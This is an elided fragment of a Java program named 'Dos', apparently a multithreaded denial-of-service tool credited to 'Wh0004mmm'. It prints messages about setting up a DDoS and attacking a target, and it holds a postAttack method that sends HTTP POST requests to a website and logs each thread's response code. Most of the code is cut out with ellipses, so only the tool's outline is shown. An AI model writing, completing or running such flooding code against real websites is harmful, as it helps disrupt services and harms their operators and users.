...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.println("Setting DDoS By: Wh0004mmm");
        ...
        System.out.println("Starting Attack To Target");
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("Attack Website done!: " + responseCode + "Thread: " + this.seq);
    }
